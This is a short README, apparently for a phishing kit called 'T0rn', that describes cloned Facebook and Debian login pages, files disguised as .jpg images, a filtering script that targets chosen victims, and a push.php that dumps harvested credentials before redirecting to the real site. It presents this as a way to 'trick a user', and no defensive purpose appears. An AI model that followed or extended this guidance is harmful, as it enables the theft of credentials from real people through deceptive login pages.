T0rn is a Social Eng. template I had created like 2-3 years ago.. I have not been 
updating it a lot (last time I did == 2013).

I've cloned a FB page, a Debian page and another random html page; The debian page is the
index file of the folder and the other two files I've saved them as .jpg files.

So to trick a user, you have to craft a nice url that  Security_Check.php can understand,
(in this case I've created Download_latest_Series_and_Movies.php)
e.g.  redirect the targeted user to a login page (in this case FB page) then dump the credentials 
using the push.php file and do the redirection to the legit FB account. If it's not the targeted 
user, redirect to the random html page.

I'll include a detailed user guide of the scripts later, but if you understand PHP go ahead and
have some fun :)
